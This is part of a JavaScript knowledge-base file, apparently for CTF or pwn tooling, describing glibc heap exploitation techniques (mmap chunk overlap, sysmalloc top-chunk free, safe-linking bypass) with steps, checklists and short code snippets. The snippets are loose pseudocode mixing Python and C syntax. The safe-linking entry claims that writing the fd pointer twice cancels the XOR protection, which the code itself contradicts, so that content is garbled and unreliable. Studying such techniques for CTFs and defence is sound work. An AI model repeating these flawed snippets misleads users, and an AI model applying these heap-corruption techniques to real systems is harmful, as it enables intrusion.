        tools: ['pwndbg vis_heap_chunks', 'pwntools'],
        codeSnippet: `# Mmap chunk
a = malloc(0x20000)  # mmap chunk
b = malloc(0x100)    # adjacent chunk

# Overflow a into b or corrupt a size
*(uint64_t*)(a + 0x8) = 0x20100  # corrupted size

# Free and reallocate
free(a)
c = malloc(0x20000)  # overlaps with b!`,
        applicableLibc: 'All versions',
        references: [
          { description: 'How2Heap: mmap_overlapping_chunks', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/mmap_overlapping_chunks.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['New allocation overlaps with mmap region', 'Arbitrary read/write via overlap'],
      artifacts: ['GDB: overlapping mmap chunks visible']
    },

    operatorChecklist: [
      '[ ] Allocate mmap chunk',
      '[ ] Overflow into mmap chunk size',
      '[ ] Corrupt size to include adjacent memory',
      '[ ] Free and reallocate',
      '[ ] Use overlap for exploitation'
    ],

    vulnerabilityTypes: ['heap', 'mmap', 'overflow'],
    references: [
      { description: 'How2Heap: mmap_overlapping_chunks', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/mmap_overlapping_chunks.c' }
    ]
  },

  sysmalloc_int_free: {
    id: 'sysmalloc_int_free',
    name: 'Sysmalloc Int Free',
    category: 'technique',
    class: 'heap-technique',
    description: 'Demonstrates freeing the nearly arbitrary sized Top Chunk (Wilderness) using malloc via sysmalloc internal free. When sysmalloc is triggered, it may call _int_free on the old top chunk, enabling exploitation of the top chunk as if it were a regular freed chunk.',

    preconditions: {
      summary: 'An overflow into the top chunk that can trigger sysmalloc and cause the old top chunk to be freed.',
      required: [
        'Heap overflow reaching top chunk',
        'Ability to trigger sysmalloc (large malloc)',
        'Top chunk size can be corrupted'
      ],
      detectionSteps: [
        'Overflow into top chunk size',
        'Trigger sysmalloc with large malloc',
        'Old top chunk freed via _int_free',
        'Freed top chunk enters appropriate bin'
      ]
    },

    exploitationPaths: [
      {
        name: 'Sysmalloc Top Chunk Free to Bin Placement',
        description: 'Trigger sysmalloc to free the top chunk into a bin for exploitation.',
        steps: [
          'Overflow into top chunk size field',
          'Corrupt top chunk size',
          'Trigger sysmalloc with large malloc',
          'Old top chunk freed via _int_free',
          'Freed chunk enters unsorted/large bin',
          'Exploit the freed chunk via standard bin techniques'
        ],
        tools: ['pwndbg heap', 'pwntools'],
        codeSnippet: `# Overflow into top chunk
*(uint64_t*)(top_chunk + 0x8) = corrupted_size

# Trigger sysmalloc
malloc(0x10000)  # large malloc

# Old top chunk freed
# Now exploitable via bin techniques`,
        applicableLibc: 'All versions',
        references: [
          { description: 'How2Heap: sysmalloc_int_free', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.39/sysmalloc_int_free.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['Top chunk freed into bin', 'Standard bin exploitation applicable'],
      artifacts: ['GDB: freed top chunk visible in bins']
    },

    operatorChecklist: [
      '[ ] Overflow into top chunk',
      '[ ] Corrupt top chunk size',
      '[ ] Trigger sysmalloc',
      '[ ] Verify top chunk freed into bin',
      '[ ] Apply standard bin exploitation'
    ],

    vulnerabilityTypes: ['heap', 'top-chunk', 'sysmalloc'],
    references: [
      { description: 'How2Heap: sysmalloc_int_free', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.39/sysmalloc_int_free.c' }
    ]
  },

  safe_link_double_protect: {
    id: 'safe_link_double_protect',
    name: 'Safe Link Double Protect',
    category: 'technique',
    class: 'heap-technique',
    description: 'Leakless bypass for PROTECT_PTR by protecting a pointer twice, allowing for arbitrary pointer linking in tcache. By XORing a pointer twice with different values, the safe linking protection can be bypassed without leaks.',

    preconditions: {
      summary: 'A UAF or overflow that allows writing to a tcache chunk fd pointer twice with different XOR values.',
      required: [
        'UAF or overflow on tcache chunk',
        'Ability to write to fd pointer twice',
        'Glibc >= 2.32 (PROTECT_PTR era)'
      ],
      detectionSteps: [
        'Identify PROTECT_PTR mechanism',
        'Write fd pointer with first XOR value',
        'Write again with second XOR value',
        'Result: arbitrary pointer in tcache'
      ]
    },

    exploitationPaths: [
      {
        name: 'Double XOR Bypass of PROTECT_PTR',
        description: 'Bypass safe linking by writing fd pointer twice with different XOR values.',
        steps: [
          'Identify PROTECT_PTR: fd XORed with (chunk_addr >> 12)',
          'Write fd with first value',
          'Write again with second value to cancel XOR',
          'Result: arbitrary pointer in tcache fd',
          'malloc returns arbitrary address'
        ],
        tools: ['pwndbg heap', 'pwntools'],
        codeSnippet: `# Double protect bypass
# Write fd twice to cancel XOR protection
*(uint64_t*)(chunk + 0x10) = value1
*(uint64_t*)(chunk + 0x10) = value2
# Result: arbitrary fd in tcache`,
        applicableLibc: '>= 2.32',
        references: [
          { description: 'How2Heap: safe_link_double_protect', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/safe_link_double_protect.c' },
          { description: '37C3 Potluck: Tamagoyaki', url: 'https://github.com/UDPctf/CTF-challenges/tree/main/Potluck-CTF-2023/Tamagoyaki' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['PROTECT_PTR bypassed', 'Arbitrary pointer in tcache'],
      artifacts: ['GDB: tcache fd points to arbitrary address']
    },

    operatorChecklist: [
      '[ ] Identify PROTECT_PTR mechanism',
      '[ ] Write fd twice with different values',
      '[ ] Verify arbitrary pointer in tcache',
      '[ ] malloc returns arbitrary address'
    ],

    vulnerabilityTypes: ['heap', 'tcache', 'safe-linking'],
    references: [
      { description: 'How2Heap: safe_link_double_protect', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/safe_link_double_protect.c' },
      { description: '37C3 Potluck: Tamagoyaki', url: 'https://github.com/UDPctf/CTF-challenges/tree/main/Potluck-CTF-2023/Tamagoyaki' }
    ]
  }
};

// Create flat list for backward compatibility
export const TECHNIQUES_LIST = Object.values(PWN_KNOWLEDGE_BASE);
